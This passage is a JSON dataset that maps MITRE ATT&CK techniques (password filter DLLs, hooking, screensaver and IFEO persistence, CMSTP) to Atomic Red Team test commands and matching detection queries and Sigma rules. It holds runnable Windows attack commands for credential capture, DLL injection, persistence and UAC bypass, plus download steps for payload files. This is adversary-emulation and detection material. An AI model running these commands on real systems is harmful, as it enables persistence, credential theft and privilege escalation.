$lsaKey.GetValue(\"Notification Packages\")\n$notificationPackagesValues += $passwordFilterName\nSet-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\" \"Notification Packages\" $notificationPackagesValues\nRestart-Computer -Confirm"], "technique_id": "T1174", "parsed_datasets": [{"Atomic Red Team Test - Password Filter DLL": {"display_name": "Password Filter DLL", "atomic_tests": [{"dependencies": [{"description": "AtomicPasswordFilter.dll must exist on disk at specified location (#{input_dll})\n", "get_prereq_command": "Write-Host \"You must provide your own password filter dll\"\n", "prereq_command": "if (Test-Path #{input_dll}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "Install and Register Password Filter DLL", "executor": {"elevation_required": true, "command": "$passwordFilterName = (Copy-Item \"#{input_dll}\" -Destination \"C:\\Windows\\System32\" -PassThru).basename\n$lsaKey = Get-Item \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\"\n$notificationPackagesValues = $lsaKey.GetValue(\"Notification Packages\")\n$notificationPackagesValues += $passwordFilterName\nSet-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\\" \"Notification Packages\" $notificationPackagesValues\nRestart-Computer -Confirm", "name": "powershell"}, "description": "Uses PowerShell to install and register a password filter DLL. Requires a reboot and administrative privileges.\n", "input_arguments": {"input_dll": {"default": "PathToAtomicsFolder\\T1174\\src\\AtomicPasswordFilter.dll", "type": "Path", "description": "Path to DLL to be installed and registered"}}, "dependency_executor_name": "powershell"}], "attack_technique": "T1174"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [], "command_list": [], "technique_id": "T1176", "parsed_datasets": [{"Atomic Red Team Test - Browser Extensions": {"display_name": "Browser Extensions", "atomic_tests": [{"description": "", "supported_platforms": ["linux", "windows", "macos"], "name": "Chrome (Developer Mode)", "executor": {"steps": "1. Navigate to [chrome://extensions](chrome://extensions) and\ntick 'Developer Mode'.\n\n2. Click 'Load unpacked extension...' and navigate to\n[Browser_Extension](../t1176/)\n\n3. Click 'Select'\n", "name": "manual"}}, {"description": "", "supported_platforms": ["linux", "windows", "macos"], "name": "Chrome (Chrome Web Store)", "executor": {"steps": "1. Navigate to https://chrome.google.com/webstore/detail/minimum-viable-malicious/odlpfdolehmhciiebahbpnaopneicend\nin Chrome\n\n2. Click 'Add to Chrome'\n", "name": "manual"}}, {"description": "Create a file called test.wma, with the duration of 30 seconds\n", "supported_platforms": ["linux", "windows", "macos"], "name": "Firefox", "executor": {"steps": "1. Navigate to [about:debugging](about:debugging) and\nclick \"Load Temporary Add-on\"\n\n2. Navigate to [manifest.json](./src/manifest.json)\n\n3. Then click 'Open'\n", "name": "manual"}}], "attack_technique": "T1176"}}], "queries": [], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1179/T1179.yaml", "command": "mavinject $pid /INJECTRUNNING PathToAtomicsFolder\\T1179\\bin\\T1179x64.dll\ncurl #{server_name}\n", "name": null}, {"source": "atomics/T1179/T1179.yaml", "command": "mavinject $pid /INJECTRUNNING PathToAtomicsFolder\\T1179\\bin\\T1179x64.dll\ncurl https://www.example.com\n", "name": null}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/netripper", "name": "Empire Module Command"}, {"source": "https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true", "command": "powershell/collection/netripper", "name": "Empire Module Command"}], "command_list": ["mavinject $pid /INJECTRUNNING PathToAtomicsFolder\\T1179\\bin\\T1179x64.dll\ncurl #{server_name}\n", "mavinject $pid /INJECTRUNNING PathToAtomicsFolder\\T1179\\bin\\T1179x64.dll\ncurl https://www.example.com\n", "powershell/collection/netripper", "powershell/collection/netripper"], "technique_id": "T1179", "parsed_datasets": [{"Atomic Red Team Test - Hooking": {"display_name": "Hooking", "atomic_tests": [{"dependencies": [{"description": "T1179x64.dll must exist on disk at specified location (#{file_name})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1179/bin/T1179x64.dll\" -OutFile \"#{file_name}\"\n", "prereq_command": "if (Test-Path #{file_name}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "Hook PowerShell TLS Encrypt/Decrypt Messages", "executor": {"elevation_required": true, "command": "mavinject $pid /INJECTRUNNING #{file_name}\ncurl #{server_name}\n", "name": "powershell"}, "description": "Hooks functions in PowerShell to read TLS Communications\n", "input_arguments": {"file_name": {"default": "PathToAtomicsFolder\\T1179\\bin\\T1179x64.dll", "type": "Path", "description": "Dll To Inject"}, "server_name": {"default": "https://www.example.com", "type": "Url", "description": "TLS Server To Test Get Request"}}, "dependency_executor_name": "powershell"}], "attack_technique": "T1179"}}, {"Empire Module XLSX Sheet by dstepanic": {"ATT&CK Technique #1": "T1179", "Empire Module": "powershell/collection/netripper", "Technique": "Hooking", "ATT&CK Technique #2": "", "Concatenate for Python Dictionary": "\"powershell/collection/netripper\":  [\"T1179\"],"}}], "queries": [{"query": "Sysmon| where EventID == 1and (process_path contains \"mavinject.exe\"or process_command_line contains \"/INJECTRUNNING\")", "product": "Azure Sentinel", "name": "Hooking"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1180/T1180.yaml", "command": "copy C:\\Windows\\System32\\cmd.exe \"%SystemRoot%\\System32\\evilscreensaver.scr\"\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 1 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveTimeout /t REG_SZ /d 60 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d \"%SystemRoot%\\System32\\evilscreensaver.scr\" /f\nshutdown /r /t 0\n", "name": null}, {"source": "SysmonHunter - Screensaver", "command": "Control Panel\\Desktop\\SCRNSAVE.EXE", "name": null}, {"source": "SysmonHunter - Screensaver", "command": "Control Panel\\Desktop\\SCRNSAVE.EXE", "name": null}], "command_list": ["copy C:\\Windows\\System32\\cmd.exe \"%SystemRoot%\\System32\\evilscreensaver.scr\"\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 1 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveTimeout /t REG_SZ /d 60 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d \"%SystemRoot%\\System32\\evilscreensaver.scr\" /f\nshutdown /r /t 0\n", "Control Panel\\Desktop\\SCRNSAVE.EXE", "Control Panel\\Desktop\\SCRNSAVE.EXE"], "technique_id": "T1180", "parsed_datasets": [{"Atomic Red Team Test - Screensaver": {"display_name": "Screensaver", "atomic_tests": [{"description": "This test copies a binary into the Windows System32 folder and sets it as the screensaver so it will execute for persistence. Requires a reboot and logon.\n", "supported_platforms": ["windows"], "name": "Set Arbitrary Binary as Screensaver", "input_arguments": {"input_binary": {"default": "C:\\Windows\\System32\\cmd.exe", "type": "path", "description": "Executable binary to use in place of screensaver for persistence"}}, "executor": {"elevation_required": true, "command": "copy #{input_binary} \"%SystemRoot%\\System32\\evilscreensaver.scr\"\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveActive /t REG_SZ /d 1 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaveTimeout /t REG_SZ /d 60 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f\nreg.exe add \"HKEY_CURRENT_USER\\Control Panel\\Desktop\" /v SCRNSAVE.EXE /t REG_SZ /d \"%SystemRoot%\\System32\\evilscreensaver.scr\" /f\nshutdown /r /t 0\n", "name": "command_prompt"}}], "attack_technique": "T1180"}}, {"SysmonHunter - T1180": {"phase": "Persistence", "query": [{"type": "reg", "reg": {"path": {"pattern": "Control Panel\\Desktop\\SCRNSAVE.EXE"}}}, {"process": {"cmdline": {"pattern": "Control Panel\\Desktop\\SCRNSAVE.EXE"}}, "type": "process"}], "description": null, "name": "Screensaver", "level": "medium"}}], "queries": [{"query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and (registry_key_path contains \"*\\\\Control Panel\\\\Desktop\\\\SCRNSAVE.EXE\")and (process_parent_command_line !contains \"explorer.exe\"or process_path !contains \"rundll32.exe\"or process_command_line !contains \"*shell32.dll,Control_RunDLL desk.cpl,ScreenSaver,*\")", "product": "Azure Sentinel", "name": "Screensaver"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1183/T1183.yaml", "command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\C:\\Windows\\System32\\calc.exe\" /v Debugger /d \"#{payload_binary}\"\n", "name": null}, {"source": "atomics/T1183/T1183.yaml", "command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\C:\\Windows\\System32\\calc.exe\" /v Debugger /d \"C:\\Windows\\System32\\cmd.exe\"\n", "name": null}, {"source": "atomics/T1183/T1183.yaml", "command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\C:\\Windows\\System32\\notepad.exe\" /v GlobalFlag /t REG_DWORD /d 512\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\C:\\Windows\\System32\\notepad.exe\" /v ReportingMode /t REG_DWORD /d 1\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\C:\\Windows\\System32\\notepad.exe\" /v MonitorProcess /d \"#{payload_binary}\"\n", "name": null}, {"source": "atomics/T1183/T1183.yaml", "command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\C:\\Windows\\System32\\notepad.exe\" /v GlobalFlag /t REG_DWORD /d 512\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\C:\\Windows\\System32\\notepad.exe\" /v ReportingMode /t REG_DWORD /d 1\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\C:\\Windows\\System32\\notepad.exe\" /v MonitorProcess /d \"C:\\Windows\\System32\\cmd.exe\"\n", "name": null}, {"source": "SysmonHunter - Image File Execution Options Injection", "command": "Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\|SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit", "name": null}, {"source": "SysmonHunter - Image File Execution Options Injection", "command": "Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\|SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit", "name": null}], "command_list": ["REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\C:\\Windows\\System32\\calc.exe\" /v Debugger /d \"#{payload_binary}\"\n", "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\C:\\Windows\\System32\\calc.exe\" /v Debugger /d \"C:\\Windows\\System32\\cmd.exe\"\n", "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\C:\\Windows\\System32\\notepad.exe\" /v GlobalFlag /t REG_DWORD /d 512\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\C:\\Windows\\System32\\notepad.exe\" /v ReportingMode /t REG_DWORD /d 1\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\C:\\Windows\\System32\\notepad.exe\" /v MonitorProcess /d \"#{payload_binary}\"\n", "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\C:\\Windows\\System32\\notepad.exe\" /v GlobalFlag /t REG_DWORD /d 512\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\C:\\Windows\\System32\\notepad.exe\" /v ReportingMode /t REG_DWORD /d 1\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\C:\\Windows\\System32\\notepad.exe\" /v MonitorProcess /d \"C:\\Windows\\System32\\cmd.exe\"\n", "Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\|SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit", "Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\|SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit"], "technique_id": "T1183", "parsed_datasets": [{"Atomic Red Team Test - Image File Execution Options": {"display_name": "Image File Execution Options", "atomic_tests": [{"description": "Leverage Global Flags Settings\n", "supported_platforms": ["windows"], "name": "IFEO Add Debugger", "input_arguments": {"target_binary": {"default": "C:\\Windows\\System32\\calc.exe", "type": "Path", "description": "Binary To Attach To"}, "payload_binary": {"default": "C:\\Windows\\System32\\cmd.exe", "type": "Path", "description": "Binary To Execute"}}, "executor": {"elevation_required": true, "command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v Debugger /d \"#{payload_binary}\"\n", "name": "command_prompt", "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v Debugger /f\n"}}, {"description": "Leverage Global Flags Settings\n", "supported_platforms": ["windows"], "name": "IFEO Global Flags", "input_arguments": {"target_binary": {"default": "C:\\Windows\\System32\\notepad.exe", "type": "Path", "description": "Binary To Attach To"}, "payload_binary": {"default": "C:\\Windows\\System32\\cmd.exe", "type": "Path", "description": "Binary To Execute"}}, "executor": {"elevation_required": true, "command": "REG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v GlobalFlag /t REG_DWORD /d 512\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v ReportingMode /t REG_DWORD /d 1\nREG ADD \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v MonitorProcess /d \"#{payload_binary}\"\n", "name": "command_prompt", "cleanup_command": "reg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\#{target_binary}\" /v GlobalFlag /f\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v ReportingMode /f\nreg delete \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\#{target_binary}\" /v MonitorProcess /f\n"}}], "attack_technique": "T1183"}}, {"SysmonHunter - T1183": {"phase": "Persistence", "query": [{"type": "reg", "reg": {"path": {"pattern": "Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\|SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit"}}}, {"process": {"cmdline": {"pattern": "Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\|SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit"}}, "type": "process"}], "description": null, "name": "Image File Execution Options Injection", "level": "medium"}}], "queries": [{"query": "Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and (registry_key_path contains \"\\\\Software\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\\"or registry_key_path contains \"\\\\Wow6432Node\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\\")", "product": "Azure Sentinel", "name": "Image File Execution Options Injection"}, {"query": "title: Registry Persistence Mechanisms\nid: 36803969-5421-41ec-b92f-8500f79c23b0\ndescription: Detects persistence registry keys\nreferences:\n    - https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/\ndate: 2018/04/11\nauthor: Karneades\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection_reg1:\n        EventID: 13\n        TargetObject:\n            - '*\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\\\*\\GlobalFlag'\n            - '*\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\\\*\\ReportingMode'\n            - '*\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\\\*\\MonitorProcess'\n        EventType: SetValue\n    condition: selection_reg1\ntags:\n    - attack.privilege_escalation\n    - attack.persistence\n    - attack.defense_evasion\n    - attack.t1183\n    - car.2013-01-002\nfalsepositives:\n    - unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "title: Registry Persistence Mechanisms\nid: 36803969-5421-41ec-b92f-8500f79c23b0\ndescription: Detects persistence registry keys\nreferences:\n    - https://oddvar.moe/2018/04/10/persistence-using-globalflags-in-image-file-execution-options-hidden-from-autoruns-exe/\ndate: 2018/04/11\nauthor: Karneades\nlogsource:\n    product: windows\n    service: sysmon\ndetection:\n    selection_reg1:\n        EventID: 13\n        TargetObject:\n            - '*\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\\\*\\GlobalFlag'\n            - '*\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\\\*\\ReportingMode'\n            - '*\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\\\*\\MonitorProcess'\n        EventType: SetValue\n    condition: selection_reg1\ntags:\n    - attack.privilege_escalation\n    - attack.persistence\n    - attack.defense_evasion\n    - attack.t1183\n    - car.2013-01-002\nfalsepositives:\n    - unknown\nlevel: critical", "product": "Atomic Threat Coverage", "name": "Sigma rule"}, {"query": "(EventID:\"13\" AND TargetObject.keyword:(*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\ NT\\\\\\\\CurrentVersion\\\\\\\\Image\\\\ File\\\\ Execution\\\\ Options\\\\\\\\*\\\\\\\\GlobalFlag OR *\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\ NT\\\\\\\\CurrentVersion\\\\\\\\SilentProcessExit\\\\\\\\*\\\\\\\\ReportingMode OR *\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows\\\\ NT\\\\\\\\CurrentVersion\\\\\\\\SilentProcessExit\\\\\\\\*\\\\\\\\MonitorProcess) AND EventType:\"SetValue\")", "product": "Atomic Threat Coverage", "name": "es-qs"}, {"query": "curl -s -XPUT -H \\'Content-Type: application/json\\' --data-binary @- localhost:9200/_watcher/watch/Registry-Persistence-Mechanisms <<EOF\\n{\\n  \"metadata\": {\\n    \"title\": \"Registry Persistence Mechanisms\",\\n    \"description\": \"Detects persistence registry keys\",\\n    \"tags\": [\\n      \"attack.privilege_escalation\",\\n      \"attack.persistence\",\\n      \"attack.defense_evasion\",\\n      \"attack.t1183\",\\n      \"car.2013-01-002\"\\n    ],\\n    \"query\": \"(EventID:\\\\\"13\\\\\" AND TargetObject.keyword:(*\\\\\\\\\\\\\\\\SOFTWARE\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ NT\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Image\\\\\\\\ File\\\\\\\\ Execution\\\\\\\\ Options\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\GlobalFlag OR *\\\\\\\\\\\\\\\\SOFTWARE\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ NT\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\SilentProcessExit\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\ReportingMode OR *\\\\\\\\\\\\\\\\SOFTWARE\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ NT\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\SilentProcessExit\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\MonitorProcess) AND EventType:\\\\\"SetValue\\\\\")\"\\n  },\\n  \"trigger\": {\\n    \"schedule\": {\\n      \"interval\": \"30m\"\\n    }\\n  },\\n  \"input\": {\\n    \"search\": {\\n      \"request\": {\\n        \"body\": {\\n          \"size\": 0,\\n          \"query\": {\\n            \"bool\": {\\n              \"must\": [\\n                {\\n                  \"query_string\": {\\n                    \"query\": \"(EventID:\\\\\"13\\\\\" AND TargetObject.keyword:(*\\\\\\\\\\\\\\\\SOFTWARE\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ NT\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\Image\\\\\\\\ File\\\\\\\\ Execution\\\\\\\\ Options\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\GlobalFlag OR *\\\\\\\\\\\\\\\\SOFTWARE\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ NT\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\SilentProcessExit\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\ReportingMode OR *\\\\\\\\\\\\\\\\SOFTWARE\\\\\\\\\\\\\\\\Microsoft\\\\\\\\\\\\\\\\Windows\\\\\\\\ NT\\\\\\\\\\\\\\\\CurrentVersion\\\\\\\\\\\\\\\\SilentProcessExit\\\\\\\\\\\\\\\\*\\\\\\\\\\\\\\\\MonitorProcess) AND EventType:\\\\\"SetValue\\\\\")\",\\n                    \"analyze_wildcard\": true\\n                  }\\n                }\\n              ],\\n              \"filter\": {\\n                \"range\": {\\n                  \"timestamp\": {\\n                    \"gte\": \"now-30m/m\"\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        },\\n        \"indices\": []\\n      }\\n    }\\n  },\\n  \"condition\": {\\n    \"compare\": {\\n      \"ctx.payload.hits.total\": {\\n        \"not_eq\": 0\\n      }\\n    }\\n  },\\n  \"actions\": {\\n    \"send_email\": {\\n      \"email\": {\\n        \"to\": \"root@localhost\",\\n        \"subject\": \"Sigma Rule \\'Registry Persistence Mechanisms\\'\",\\n        \"body\": \"Hits:\\\\n{{#ctx.payload.hits.hits}}{{_source}}\\\\n================================================================================\\\\n{{/ctx.payload.hits.hits}}\",\\n        \"attachments\": {\\n          \"data.json\": {\\n            \"data\": {\\n              \"format\": \"json\"\\n            }\\n          }\\n        }\\n      }\\n    }\\n  }\\n}\\nEOF\\n", "product": "Atomic Threat Coverage", "name": "xpack-watcher"}, {"query": "(EventID:\"13\" AND TargetObject.keyword:(*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\*\\\\\\\\GlobalFlag *\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\SilentProcessExit\\\\\\\\*\\\\\\\\ReportingMode *\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\SilentProcessExit\\\\\\\\*\\\\\\\\MonitorProcess) AND EventType:\"SetValue\")", "product": "Atomic Threat Coverage", "name": "graylog"}, {"query": "(EventID=\"13\" (TargetObject=\"*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\*\\\\\\\\GlobalFlag\" OR TargetObject=\"*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\SilentProcessExit\\\\\\\\*\\\\\\\\ReportingMode\" OR TargetObject=\"*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\SilentProcessExit\\\\\\\\*\\\\\\\\MonitorProcess\") EventType=\"SetValue\")", "product": "Atomic Threat Coverage", "name": "splunk"}, {"query": "(event_id=\"13\" TargetObject IN [\"*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\Image File Execution Options\\\\\\\\*\\\\\\\\GlobalFlag\", \"*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\SilentProcessExit\\\\\\\\*\\\\\\\\ReportingMode\", \"*\\\\\\\\SOFTWARE\\\\\\\\Microsoft\\\\\\\\Windows NT\\\\\\\\CurrentVersion\\\\\\\\SilentProcessExit\\\\\\\\*\\\\\\\\MonitorProcess\"] EventType=\"SetValue\")", "product": "Atomic Threat Coverage", "name": "logpoint"}, {"query": "grep -P '^(?:.*(?=.*13)(?=.*(?:.*.*\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Image File Execution Options\\\\\\\\.*\\\\GlobalFlag|.*.*\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SilentProcessExit\\\\\\\\.*\\\\ReportingMode|.*.*\\\\SOFTWARE\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\SilentProcessExit\\\\\\\\.*\\\\MonitorProcess))(?=.*SetValue))'", "product": "Atomic Threat Coverage", "name": "grep"}], "possible_detections": [], "attack_paths": []}, {"commands": [{"source": "atomics/T1191/T1191.yaml", "command": "cmstp.exe /s PathToAtomicsFolder\\T1191\\src\\T1191.inf\n", "name": null}, {"source": "atomics/T1191/T1191.yaml", "command": "cmstp.exe /s PathToAtomicsFolder\\T1191\\src\\T1191_uacbypass.inf /au\n", "name": null}, {"source": "Threat Hunting Tables", "command": "winword.exe", "name": "parent_process"}, {"source": "Threat Hunting Tables", "command": "cmstp.exe", "name": "sub_process_1"}, {"source": "SysmonHunter - CMSTP", "command": "/s|/ns|/aucmstp.exe", "name": null}], "command_list": ["cmstp.exe /s PathToAtomicsFolder\\T1191\\src\\T1191.inf\n", "cmstp.exe /s PathToAtomicsFolder\\T1191\\src\\T1191_uacbypass.inf /au\n", "winword.exe", "cmstp.exe", "/s|/ns|/aucmstp.exe"], "technique_id": "T1191", "parsed_datasets": [{"Atomic Red Team Test - CMSTP": {"display_name": "CMSTP", "atomic_tests": [{"dependencies": [{"description": "INF file must exist on disk at specified location (#{inf_file_path})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{inf_file_path}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1191/src/T1191.inf\" -OutFile \"#{inf_file_path}\"\n", "prereq_command": "if (Test-Path #{inf_file_path}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "CMSTP Executing Remote Scriptlet", "executor": {"elevation_required": false, "command": "cmstp.exe /s #{inf_file_path}\n", "name": "command_prompt"}, "description": "Adversaries may supply CMSTP.exe with INF files infected with malicious commands\n", "input_arguments": {"inf_file_path": {"default": "PathToAtomicsFolder\\T1191\\src\\T1191.inf", "type": "path", "description": "Path to the INF file"}}, "dependency_executor_name": "powershell"}, {"dependencies": [{"description": "INF file must exist on disk at specified location (#{inf_file_uac})\n", "get_prereq_command": "New-Item -Type Directory (split-path #{inf_file_uac}) -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1191/src/T1191_uacbypass.inf\" -OutFile \"#{inf_file_uac}\"\n", "prereq_command": "if (Test-Path #{inf_file_uac}) {exit 0} else {exit 1}\n"}], "supported_platforms": ["windows"], "name": "CMSTP Executing UAC Bypass", "executor": {"elevation_required": false, "command": "cmstp.exe /s #{inf_file_uac} /au\n", "name": "command_prompt"}, "description": "Adversaries may invoke cmd.exe (or other malicious commands) by embedding them in the RunPreSetupCommandsSection of an INF file\n", "input_arguments": {"inf_file_uac": {"default": "PathToAtomicsFolder\\T1191\\src\\T1191_uacbypass.inf", "type": "path", "description": "Path to the INF file"}}, "dependency_executor_name": "powershell"}], "attack_technique": "T1191"}}, {"Threat Hunting Tables": {"mitre_attack": "T1191", "file_value": "", "file_path": "", "parent_process": "winword.exe", "itw_sample": "", "chain_id": "100210", "registry_value": "", "mitre_caption": "cmstp", "registry_path": "", "frequency": "low", "commandline_string": "", "loaded_dll": "", "os": "windows", "sub_process_1": "cmstp.exe", "sub_process_2": ""}}, {"SysmonHunter - T1191": {"phase": "Execution", "query": [{"process": {"cmdline": {"pattern": "/s|/ns|/au"}, "image": {"pattern": "cmstp.exe"}}, "type": "process"}], "description": null, "name": "CMSTP", "level": "medium"}}], "queries": [{"query": "Sysmon| where EventID == 1and process_path contains 